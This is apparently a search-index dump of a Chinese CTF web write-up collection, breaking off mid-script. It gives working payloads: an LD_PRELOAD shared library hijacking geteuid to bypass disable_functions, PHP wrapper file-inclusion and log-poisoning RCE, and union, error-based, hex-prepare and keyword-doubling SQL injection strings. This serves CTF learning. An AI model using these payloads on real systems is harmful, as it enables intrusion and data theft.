<pre><code>var_dump(file_get_contents('./f1ag.php'));\n</code></pre>"},{"location":"Web/Chapter6/6-9/","title":"LD_PRELOAD \u73af\u5883\u53d8\u91cf\u63d0\u6743","text":""},{"location":"Web/Chapter6/6-9/#ld_preload-\u73af\u5883\u53d8\u91cf\u63d0\u6743","title":"LD_PRELOAD \u73af\u5883\u53d8\u91cf\u63d0\u6743","text":"<p>\u52a0\u5bc6\u6df7\u6dc6\uff0c\u8fd9\u4e00\u6b65\u56e0\u4e3a\u89e3\u5bc6\u7f51\u7ad9\u6302\u4e86\u5c31\u8df3\u8fc7</p> <p></p> <p>\u7f51\u4e0a\u627e\u7684\u56fe</p> <p></p> <p>\u4f7f\u7528\u4e2d\u56fd\u8681\u5251\u8fdc\u7a0b\u8fde\u63a5</p> <p></p> <p>\u8bbf\u95ee\u522b\u7684\u76ee\u5f55\u62a5\u9519\uff0c\u5e94\u8be5\u8bbe\u7f6e\u4e86 disable_function \u51fd\u6570</p> <p></p> <p>\u57fa\u4e8e\u9ed1\u540d\u5355\u6765\u5b9e\u73b0\u5bf9\u67d0\u4e9b\u51fd\u6570\u4f7f\u7528\u7684\u9650\u5236</p> <p></p> <p>\u4f7f\u7528\u8681\u5251\u7684\u63d2\u4ef6\u7ed5\u8fc7\uff0c\u7f51\u4e0d\u884c\u7684\u81ea\u5df1\u53bb GitHub \u4e0a\u4e0b\u63d2\u4ef6</p> <p></p> <p>LD_PRELOAD \u662f\u4e00\u4e2a\u53ef\u9009\u7684 Unix \u73af\u5883\u53d8\u91cf\uff0c  \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u5171\u4eab\u5e93\u6216\u5171\u4eab\u5e93\u7684\u8def\u5f84</p> <p>\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5373\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u751f\u6210\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\u52a0\u8f7d\uff0c\u4ee5\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\uff0c\u4e5f\u53ef\u4ee5\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\uff0c\u6267\u884c\u6076\u610f\u547d\u4ee4</p> <p>\u539f\u6587\u94fe\u63a5</p> <p></p> <p>\u6700\u540e\u8fdc\u7a0b\u8fde\u63a5\u8fd9\u4e2a\u65b0\u6728\u9a6c\u5c31\u884c\u4e86\uff0c\u5bc6\u7801\u4e00\u6837\u7684</p> <p></p> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u624b\u52a8\uff08\u4ee5\u4e0b\u4ee3\u7801\u5747\u9002\u7528\u4e8e CTFHUB \u7684 LD_PRELOAD \u4e00\u9898\uff09</p> <pre><code>#include &lt;stdlib.h&gt;   // \u5305\u542b system(), getenv(), unsetenv() \u7b49\u51fd\u6570\n#include &lt;stdio.h&gt;    // \u5305\u542b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u51fd\u6570\uff0c\u5982 printf()\n#include &lt;string.h&gt;   // \u5305\u542b\u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\uff08\u867d\u7136\u672c\u7a0b\u5e8f\u4e2d\u672a\u4f7f\u7528\uff09\n\n// payload \u51fd\u6570\uff1a\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u5c06 /readflag \u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230 /tmp/flag \u6587\u4ef6\u4e2d\nvoid payload() {\n    system(\"/readflag &gt;/tmp/flag\");  // \u8c03\u7528 shell \u6267\u884c\u547d\u4ee4\uff0c\u8bfb\u53d6 flag \u5e76\u5199\u5165\u4e34\u65f6\u6587\u4ef6\n}\n\n// \u91cd\u5199\u7684 geteuid \u51fd\u6570\uff1a\u901a\u5e38\u7528\u4e8e\u8fd4\u56de\u6709\u6548\u7528\u6237ID\uff0c\u4f46\u6b64\u5904\u7528\u4e8e\u6076\u610f\u64cd\u4f5c\nint geteuid() {\n    // \u68c0\u67e5\u73af\u5883\u53d8\u91cf LD_PRELOAD \u662f\u5426\u5b58\u5728\n    if (getenv(\"LD_PRELOAD\") == NULL) {\n        // \u5982\u679c LD_PRELOAD \u6ca1\u6709\u8bbe\u7f6e\uff0c\u8fd4\u56de 0\uff0c\u8868\u793a\u6ca1\u6709\u52ab\u6301\u52a8\u6001\u94fe\u63a5\u5e93\n        return 0;\n    }\n\n    // \u5982\u679c\u8bbe\u7f6e\u4e86 LD_PRELOAD\uff0c\u5148\u53d6\u6d88\u8bbe\u7f6e\uff0c\u907f\u514d\u540e\u7eed\u5f71\u54cd\n    unsetenv(\"LD_PRELOAD\");\n\n    // \u6267\u884c\u6076\u610f payload\uff0c\u5c06\u654f\u611f\u4fe1\u606f\u5199\u5165 /tmp/flag\n    payload();\n}\n</code></pre> <p>\u8bb0\u5f97\u5148\u52a0\u6743\u9650</p> <pre><code>gcc -fPIC -shared hack.c -o hack.so\n</code></pre> \u90e8\u5206 \u542b\u4e49 <code>gcc</code> GNU C \u7f16\u8bd1\u5668\uff0c\u7528\u4e8e\u7f16\u8bd1 C \u7a0b\u5e8f <code>-fPIC</code> \u751f\u6210\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\uff08Position-Independent Code\uff09\u8fd9\u662f\u6784\u5efa\u5171\u4eab\u5e93\uff08<code>.so</code> \u6587\u4ef6\uff09\u6240\u5fc5\u987b\u7684\u9009\u9879\uff0c\u5141\u8bb8\u751f\u6210\u7684\u4ee3\u7801\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u4efb\u610f\u5185\u5b58\u5730\u5740\u800c\u4e0d\u51fa\u9519 <code>-shared</code> \u6307\u5b9a\u751f\u6210\u4e00\u4e2a\u5171\u4eab\u5e93\uff08<code>.so</code> \u6587\u4ef6\uff09\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6 <code>hack.c</code> \u8981\u7f16\u8bd1\u7684\u6e90\u6587\u4ef6\uff0c\u91cc\u9762\u901a\u5e38\u5305\u542b\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\uff08\u5982\u91cd\u5b9a\u4e49 <code>geteuid()</code>\uff09 <code>-o hack.so</code> \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u540d\u4e3a <code>hack.so</code>\uff08\u751f\u6210\u7684\u5171\u4eab\u5bf9\u8c61\uff09 <p>\u7136\u540e\u4e0a\u4f20\u5230 <code>/tmp</code>\u76ee\u5f55\u4e0b</p> <pre><code>&lt;?php\n// \u8bbe\u7f6e\u73af\u5883\u53d8\u91cf LD_PRELOAD \u4e3a /tmp/hack.so\n// \u8fd9\u6837\u5728\u8c03\u7528\u67d0\u4e9b\u7cfb\u7edf\u51fd\u6570\u65f6\u4f1a\u4f18\u5148\u52a0\u8f7d /tmp/hack.so \u4e2d\u7684\u51fd\u6570\u5b9e\u73b0\uff08\u5982\u52ab\u6301 geteuid\uff09\nputenv(\"LD_PRELOAD=/tmp/hack.so\");\n\n// \u89e6\u53d1\u67d0\u4e9b\u5e95\u5c42 C \u51fd\u6570\u8c03\u7528\uff08\u5982 geteuid\uff09\u7684\u65b9\u6cd5\u4e4b\u4e00\n// \u6b64\u5904\u8c03\u7528 error_log \u5c3d\u7ba1\u53c2\u6570\u662f\u7a7a\u7684\uff0c\u4f46\u6709\u53ef\u80fd\u89e6\u53d1\u5185\u90e8\u7cfb\u7edf\u8c03\u7528\uff0c\u4ece\u800c\u89e6\u53d1 hack.so \u4e2d\u7684\u6076\u610f\u51fd\u6570\nerror_log(\"\", 1, \"\", \"\");\n\n// \u8f93\u51fa\u63d0\u793a\u4fe1\u606f\uff0c\u8bf4\u660e PHP \u811a\u672c\u6267\u884c\u5b8c\u6bd5\necho \"ok\";\n?&gt;\n</code></pre> <p>\u4e0a\u4f20\u6587\u4ef6</p> <p></p> <p>s</p> <p>\u8bbf\u95ee\u6587\u4ef6</p> <p></p> <p>\u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 </p> <p></p>"},{"location":"Web/Chapter7/7-1/","title":"input","text":""},{"location":"Web/Chapter7/7-1/#input","title":"input","text":"<p>\u6253\u5f00\u9875\u9762\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <p></p> <p><code>extract()</code> \u51fd\u6570\u4ece\u6570\u7ec4\u4e2d\u5c06\u53d8\u91cf\u5bfc\u5165\u5230\u5f53\u524d\u7684\u7b26\u53f7\u8868\uff0c\u8be5\u51fd\u6570\u4f7f\u7528\u6570\u7ec4\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\u540d\uff0c\u4f7f\u7528\u6570\u7ec4\u952e\u503c\u4f5c\u4e3a\u53d8\u91cf\u503c</p> <p></p> <p><code>empty()</code> \u51fd\u6570\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u7a7a\u4e3a <code>False</code></p> <p><code>trim()</code> \u51fd\u6570\u79fb\u9664\u5b57\u7b26\u4e32\u4e24\u4fa7\u7684\u7a7a\u767d\u5b57\u7b26\u6216\u5176\u4ed6\u9884\u5b9a\u4e49\u5b57\u7b26</p> <p><code>file_get_contents()</code> \u628a\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d</p> <p></p> <p>\u7531\u6b64\u53ef\u4ee5\u770b\u51fa\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed3\u5408 PHP \u4f2a\u534f\u8bae</p> <p><code>php://input</code> \u5728 POST \u8bf7\u6c42\u4e2d\u8bbf\u95ee\u5176\u4e2d\u7684 <code>data</code> \u90e8\u5206\uff0c\u6211\u4eec\u53ef\u4ee5 GET \u4f20\u5165 <code>ac</code> \u503c\uff0cfn \u4e3a\u4f2a\u534f\u8bae\uff0c\u6700\u540e POST \u4f20\u5165 <code>ac</code> \u503c\u4f7f\u6761\u4ef6\u6210\u7acb</p> <p></p>"},{"location":"Web/Chapter7/7-2/","title":"filter","text":""},{"location":"Web/Chapter7/7-2/#filter","title":"filter","text":"<p>\u6253\u5f00\u7f51\u9875\u6709\u4e2a\u94fe\u63a5</p> <p></p> <p>\u70b9\u51fb\u8fdb\u53bb\u53d1\u73b0 URL \u8def\u5f84\u53d8\u6210\u4e86 file \u53c2\u6570</p> <p></p> <p>\u4f7f\u7528 PHP \u4f2a\u534f\u8bae\u8bfb\u53d6\u6e90\u7801</p> <p>php://filter \u7528\u4e8e\u8bfb\u53d6\u6e90\u4ee3\u7801\u5e76\u8f93\u51fa\uff0cconvert.base64-encode \u8fdb\u884c Base64 \u7f16\u7801\u8f93\u51fa\uff0cresource \u6307\u5b9a\u8bfb\u53d6\u6587\u4ef6</p> <p></p> <p>\u89e3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter7/7-3/","title":"Nginx \u65e5\u5fd7 RCE","text":""},{"location":"Web/Chapter7/7-3/#nginx-\u65e5\u5fd7-rce","title":"Nginx \u65e5\u5fd7 RCE","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <p></p> <p>\u6587\u4ef6\u5305\u542b\u662f\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\u7684\uff0c\u4f46\u662f\u6ca1\u6709 <code>/flag</code> \u6587\u4ef6</p> <p></p> <p>\u5206\u6790\u67b6\u6784\u4e3a Nginx \u670d\u52a1\u5668</p> <p></p> <p>\u5c1d\u8bd5\u8bbf\u95ee\u65e5\u5fd7\u6587\u4ef6 <code>/var/log/nginx/error.log</code> \u548c <code>/var/log/nginx/access.log</code></p> <p></p> <p>\u53d1\u73b0 <code>access.log</code> \u88ab\u8bbe\u7f6e\u4e3a\u4e86 UA \u5934</p> <p></p> <p>\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u6539 UA \u5934\u4e3a PHP \u4ee3\u7801</p> <pre><code>User-Agent: &lt;?php echo system('ls');?&gt;\n</code></pre> <p></p> <p>\u518d\u67e5\u770b <code>flag.php</code></p> <pre><code>User-Agent: &lt;?php system('cat flag.php');?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter7/7-4/","title":"data \u4f2a\u534f\u8bae RCE","text":""},{"location":"Web/Chapter7/7-4/#data-\u4f2a\u534f\u8bae-rce","title":"data \u4f2a\u534f\u8bae RCE","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u4ee3\u7801</p> <p><code>strstr()</code> \u7528\u4e8e\u67e5\u627e\u5b57\u7b26\u4e32\u9996\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p><code>str_replace()</code> \u4ee5\u5176\u4ed6\u5b57\u7b26\u66ff\u6362\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e9b\u5b57\u7b26\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <pre><code>&lt;?php\nshow_source(__FILE__);\necho $_GET['hello'];\n$page=$_GET['page'];\nwhile (strstr($page, \"php://\")) {\n    $page=str_replace(\"php://\", \"\", $page);\n}\ninclude($page);\n?&gt;\n</code></pre> <p>\u867d\u7136\u7981\u7528\u4e86 <code>php://</code> \u4f2a\u534f\u8bae\uff0c\u4f46\u662f <code>data://</code> \u8fd8\u53ef\u4ee5\u4f7f\u7528</p> <p>\u5982\u679c\u4f20\u5165\u7684\u6570\u636e\u662f PHP \u4ee3\u7801\uff0c\u5c31\u4f1a\u6267\u884c\u4ee3\u7801\uff0c\u7528\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>data://text/plain;base64,xxxx(base64 \u7f16\u7801\u540e\u7684\u6570\u636e)\n</code></pre> <p>\u6216\u8005</p> <pre><code>data://text/plain,xxx(\u6570\u636e)\n</code></pre> <p></p>"},{"location":"Web/Chapter7/7-5/","title":"data \u4f2a\u534f\u8bae RCE \u7ed5\u8fc7\u53cc\u659c\u6760","text":""},{"location":"Web/Chapter7/7-5/#data-\u4f2a\u534f\u8bae-rce-\u7ed5\u8fc7\u53cc\u659c\u6760","title":"data \u4f2a\u534f\u8bae RCE \u7ed5\u8fc7\u53cc\u659c\u6760","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif(isset($_GET['file'])){\n        $file = $_GET['file'];\n}\n// \u5047\u5982\u6211\u589e\u52a0\u4e86\u8fc7\u6ee4\uff0c\u4f60\u53c8\u8be5\u5982\u4f55\u5e94\u5bf9\u5462\uff1f\nif(preg_match('/php:\\/\\/|file:\\/\\/|flag|http:\\/\\/|log|phar:\\/\\/|data:\\/\\//i', $file)){\n        echo 'No No No !';\n}\nelse{\n        include $file;\n}\n</code></pre> <p></p> <p>\u8fd9\u91cc\u7684\u6b63\u5219\u53ea\u5339\u914d\u4e86 <code>data://</code>\uff0c\u6ca1\u6709\u8fc7\u6ee4\u6574\u4e2a <code>data</code> \u4f2a\u534f\u8bae\uff0c\u6240\u4ee5\u6211\u4eec\u53bb\u6389 <code>//</code> \u5373\u53ef\u7ed5\u8fc7</p> <pre><code>?file=data:text/plain,&lt;?php system('cat /fl\\ag');?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-1/","title":"\u8054\u5408\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-1/#\u8054\u5408\u6ce8\u5165","title":"\u8054\u5408\u6ce8\u5165","text":"<p>\u8f93\u5165\u6570\u503c\u67e5\u8be2</p> <p></p> <p>\u5224\u65ad\u7c7b\u578b\uff0c\u52a0\u4e2a\u5355\u5f15\u53f7\u95ed\u5408\u6ca1\u6709\u56de\u663e</p> <p></p> <p>\u518d\u8ddf\u4e0a\u6c38\u771f\u6761\u4ef6\u52a0\u6ce8\u91ca\u7b26\u6d4b\u8bd5\u5f97\u51fa\u7c7b\u578b\u662f\u6570\u5b57\u578b</p> <p></p> <p>\u5229\u7528 <code>order by</code> \u5224\u65ad\u5217\u6570\uff0c\u8fd9\u91cc\u8bd5\u51fa\u4e3a 4 \u5217</p> <pre><code>1' order by 4 #\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5229\u7528 <code>union</code> \u6784\u9020\u67e5\u8be2\u8bed\u53e5</p> <p>\u6211\u4eec\u9700\u8981\u5c06 1 \u6539\u4e3a -1 \u4f7f\u5176\u4e3a\u5047\u6ca1\u6709\u56de\u663e\u5185\u5bb9\uff0c\u5219\u540e\u53f0\u5c06\u8fd4\u56de\u7b2c\u4e8c\u4e2a <code>select</code> \u8bed\u53e5\u7684\u7ed3\u679c\u96c6</p> <pre><code>-1' union select 1,2,3,4 #\n</code></pre> <p></p> <p>\u5229\u7528\u8fd9\u4e2a\u8bed\u53e5\u67e5\u8be2\u6570\u636e\u5e93\u540d\uff0c\u4f7f\u7528\u51fd\u6570 <code>database()</code></p> <pre><code>-1' union select 1,2,3,database() #\n</code></pre> <p></p> <p>\u6709\u4e86\u5e93\u540d\u63a5\u4e0b\u6765\u53bb\u67e5\u6709\u54ea\u4e9b\u8868</p> <p><code>information_schema.tables</code> \u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u6570\u636e\u5e93</p> <p>\u5b83\u5305\u542b\u4e86\u6240\u6709\u5176\u4ed6\u6570\u636e\u5e93\u7684\u5143\u6570\u636e\uff0c\u5982\u8868\u7ed3\u6784\u3001\u5217\u4fe1\u606f\u3001\u7d22\u5f15\u7b49</p> <p><code>table_schema</code> \u5219\u662f\u6570\u636e\u5e93\u540d\uff0c\u8981\u8003\u8651\u663e\u793a\u533a\u57df\u6709\u9650\uff0c\u4f7f\u7528 <code>group_concat()</code> \u51fd\u6570</p> <p>\u5b83\u5c06\u6240\u6709\u8868\u540d\u5408\u5e76\u6210\u4e00\u4e2a\u5355\u4e00\u7684\u5b57\u7b26\u4e32\uff0c\u6bcf\u4e2a\u8868\u540d\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694</p> <pre><code>-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema='skctf' #\n</code></pre> <p></p> <p>\u6709\u4e2a <code>fl4g</code> \u7684\u8868\uff0c\u53bb\u67e5\u8be2\u5217\u540d</p> <pre><code>-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='fl4g' #\n</code></pre> <p></p> <p>\u6700\u540e\u67e5\u8be2\u6211\u4eec\u60f3\u8981\u7684\u6570\u636e</p> <pre><code>-1' union select 1,2,3,group_concat(skctf_flag) from fl4g #\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-10/","title":"\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7","text":""},{"location":"Web/Chapter8/8-10/#\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7","title":"\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7","text":"<p>\u7ee7\u4e0a\u4e00\u8282\u6539\u8868\u7ed5\u8fc7\u540e\uff0c\u8fd9\u9898\u8fd8\u6709\u522b\u7684\u65b9\u6cd5\uff0c</p> <p>\u56e0\u4e3a select \u88ab\u8fc7\u6ee4\u4e86\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7ed5\u8fc7</p> <p></p> <p>\u8bbe\u7f6e\u4e00\u4e2a\u53d8\u91cf\u503c\u4fdd\u5b58\u8fd9\u6bb5\u5341\u516d\u8fdb\u5236</p> <pre><code>SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;\n</code></pre> <p><code>prepare\u2026from\u2026</code> \u662f\u9884\u7f16\u8bd1\u8bed\u53e5\uff0c\u4f1a\u8fdb\u884c\u7f16\u7801\u8f6c\u6362</p> <p><code>execsql</code> \u662f\u4e00\u4e2a\u4e34\u65f6\u7684 SQL \u8bed\u53e5\u540d\u79f0</p> <pre><code>prepare execsql from @a;\n</code></pre> <p><code>execute</code> \u6267\u884c SQL \u8bed\u53e5</p> <pre><code>execute execsql;#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-11/","title":"handler \u4ee3\u66ff select","text":""},{"location":"Web/Chapter8/8-11/#handler-\u4ee3\u66ff-select","title":"handler \u4ee3\u66ff select","text":"<p>\u5982\u679c handler \u6ca1\u6709\u88ab\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee3\u66ff select</p> <p>\u4f46\u5b83\u53ea\u80fd\u4e00\u884c\u4e00\u884c\u8bfb\u53d6\u6570\u636e</p> <p>\u9996\u5148\u4f7f\u7528 <code>handler table_name open</code> \u6253\u5f00\u8fd9\u4e2a\u6570\u5b57\u8868</p> <pre><code>handler `1919810931114514` open as a;\n</code></pre> <p>\u6253\u5f00\u6210\u529f\u540e\u624d\u80fd\u5f00\u59cb\u8bfb\u53d6\u6570\u636e</p> <pre><code>handler `a` read next;#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-12/","title":"\u53cc\u5199\u7ed5\u8fc7","text":""},{"location":"Web/Chapter8/8-12/#\u53cc\u5199\u7ed5\u8fc7","title":"\u53cc\u5199\u7ed5\u8fc7","text":"<p>\u521d\u6b21\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u5931\u8d25</p> <p>\u53cc\u5199\u5173\u952e\u5b57 <code>or</code> \u767b\u5f55\u6210\u529f</p> <p></p> <p></p> <p>\u731c\u731c\u5217\u6570\u6709\u4e09\u4f4d</p> <pre><code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,3#\n</code></pre> <p></p> <p>\u67e5\u8868</p> <pre><code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()#\n</code></pre> <p></p> <p>\u67e5\u5217\u5b57\u6bb5</p> <pre><code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name='b4bsql'#\n</code></pre> <p></p> <p>\u7206\u6570\u636e</p> <pre><code>?username=admin&amp;password=admin' uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-13/","title":"updatexml() \u62a5\u9519\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-13/#updatexml-\u62a5\u9519\u6ce8\u5165","title":"updatexml() \u62a5\u9519\u6ce8\u5165","text":"<p>\u521d\u6b21\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6210\u529f\uff0c\u8bf4\u660e\u95ed\u5408\u4e3a\u5355\u5f15\u53f7</p> <p></p> <p><code>updatexml()</code> \u7528\u4e8e\u66f4\u65b0 XML \u6570\u636e\uff0c\u5b83\u63a5\u53d7 3 \u4e2a\u53c2\u6570</p> <pre><code># xml_target\uff1a\u76ee\u6807 XML \u6587\u672c\uff08\u5fc5\u987b\u662f\u5408\u6cd5 XML \u683c\u5f0f\uff0c\u5426\u5219\u62a5\u9519\uff09\n# xpath_expr\uff1aXPath \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u9009\u4e2d XML \u4e2d\u7684\u8282\u70b9\n# new_value\uff1a\u8981\u66f4\u65b0\u7684\u65b0\u503c\nUPDATEXML(xml_target, xpath_expr, new_value)\n</code></pre> <p>\u5728 MySQL \u4e2d\u4f7f\u7528 <code>updatexml()</code> \u51fd\u6570\u62a5\u9519\u65f6\uff0c\u5b83\u901a\u5e38\u4f1a\u629b\u51fa\u4e00\u4e2a XPATH \u8bed\u6cd5\u9519\u8bef\uff0c\u5e76\u5c06\u4f60\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff08\u5373 XPath \u8868\u8fbe\u5f0f\uff09\u7684\u4e00\u90e8\u5206\u76f4\u63a5\u663e\u793a\u5728\u9519\u8bef\u4fe1\u606f\u4e2d</p> <p>\u7b2c\u4e00\u3001\u4e09\u4e2a\u53c2\u6570\u80af\u5b9a\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 <code>database()</code> \u653e\u5728\u4e2d\u95f4\uff0c\u8fd9\u6837\u5c31\u4f1a\u6267\u884c\u663e\u793a\u51fa\u6570\u636e\u5e93\u540d</p> <p>\u53ef\u4ee5\u518d\u52a0\u4e0a <code>concat()</code> \u51fd\u6570\u5c06\u663e\u793a\u5185\u5bb9\u5305\u88f9\u8d77\u6765\uff0c<code>0x7e</code> \u5373\u6ce2\u6d6a\u53f7 <code>~</code></p> <pre><code>1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u7206\u8868\uff0c\u8fd9\u91cc\u6ce8\u610f <code>=</code> \u88ab\u8fc7\u6ee4\u4e86\u4f7f\u7528 <code>like</code> \u4ee3\u66ff</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5b57\u6bb5</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n</code></pre> <p></p> <p>\u67e5\u5b57\u6bb5\u5185\u5bb9</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#\n</code></pre> <p></p> <p>\u4f7f\u7528 <code>right()</code> \u7a81\u7834\u5b57\u7b26\u9650\u5236</p> <pre><code>1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-14/","title":"extractvalue() \u62a5\u9519\u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-14/#extractvalue-\u62a5\u9519\u6ce8\u5165","title":"extractvalue() \u62a5\u9519\u6ce8\u5165","text":"<p>\u521d\u6b21\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u767b\u5f55\u6210\u529f\uff0c\u8bf4\u660e\u95ed\u5408\u4e3a\u5355\u5f15\u53f7</p> <p></p> <p><code>extractvalue()</code> \u662f MySQL \u7684 XML \u51fd\u6570\uff0c\u7528\u4e8e\u4ece XML \u5b57\u7b26\u4e32\u4e2d\u63d0\u53d6\u6570\u636e</p> <pre><code># xml_fragment\uff1a\u4e00\u4e2a\u5408\u6cd5\u7684 XML \u7ed3\u6784\u4f53\uff08\u5b57\u7b26\u4e32\u683c\u5f0f\uff09\n# xpath_expression\uff1aXPath \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u4ece XML \u4e2d\u5b9a\u4f4d\u5e76\u63d0\u53d6\u8282\u70b9\u6216\u5c5e\u6027\u503c\nEXTRACTVALUE(xml_fragment, xpath_expression)\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u80af\u5b9a\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 <code>database()</code> \u653e\u5728\u4e2d\u95f4\uff0c\u8fd9\u6837\u5c31\u4f1a\u6267\u884c\u663e\u793a\u51fa\u6570\u636e\u5e93\u540d</p> <p>\u53ef\u4ee5\u518d\u52a0\u4e0a <code>concat()</code> \u51fd\u6570\u5c06\u663e\u793a\u5185\u5bb9\u5305\u88f9\u8d77\u6765\uff0c<code>0x7e</code> \u5373\u6ce2\u6d6a\u53f7 <code>~</code></p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(database()))))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u7206\u8868\uff0c\u8fd9\u91cc\u6ce8\u610f <code>=</code> \u88ab\u8fc7\u6ee4\u4e86\u4f7f\u7528 <code>like</code> \u4ee3\u66ff</p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u7206\u5b57\u6bb5</p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#\n</code></pre> <p></p> <p>\u67e5\u5b57\u6bb5\u5185\u5bb9</p> <pre><code>1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#\n</code></pre> <p></p> <p>\u4f7f\u7528 <code>right()</code> \u7a81\u7834\u5b57\u7b26\u9650\u5236</p> <pre><code>1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-15/","title":"\u5e03\u5c14\u76f2\u6ce8","text":""},{"location":"Web/Chapter8/8-15/#\u5e03\u5c14\u76f2\u6ce8","title":"\u5e03\u5c14\u76f2\u6ce8","text":"<p>\u8003\u5bdf SQL \u6ce8\u5165\uff0c\u7ed9\u51fa\u4e86 flag \u4f4d\u7f6e</p> <p></p> <p>\u6d4b\u8bd5\u6570\u636e\u53d1\u73b0\u662f\u5e03\u5c14\u7c7b\u578b</p> <p></p> <p>\u4f7f\u7528\u811a\u672c\u7206\u7834</p> <pre><code>import requests \n\nurl = \"http://3bdb8fd8-acb8-4230-96d0-3845226525ba.node4.buuoj.cn:81/index.php\"\nflag = \"\"\ni = 0\n\n\nwhile True:\n    i = i + 1\n    letf = 32\n    right 